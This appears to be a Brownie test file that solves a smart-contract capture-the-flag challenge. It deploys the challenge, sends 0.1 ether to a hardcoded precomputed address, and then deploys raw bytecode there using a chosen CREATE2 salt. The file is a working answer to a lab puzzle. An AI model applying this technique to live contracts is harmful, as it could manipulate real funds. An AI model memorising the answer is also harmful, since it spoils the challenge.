def test_solve(a, Factory, Setup, Challenge):
    s = Setup.deploy({"from": a[0]})
    factory = Factory.at(s.factory())
    challenge = Challenge.at(s.challenge())
    a[0].transfer("0xD76048662BEdAD7625557b82ff6046874Cbf0b1D", 0.1e18, 12000000)
    bytecode = "0x6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea2646970667358221220a086b15266b2b2e538c6fbc1e527d8e2cd4b97d4b7a2e9e3154fa1535d604f4a64736f6c63430008040033"
    salt = "0x0000000000000000000000000000000000000000000000000000000003496263"
    challenge.createContract(bytecode, salt, {"from": a[0], "gas_limit": 12000000})
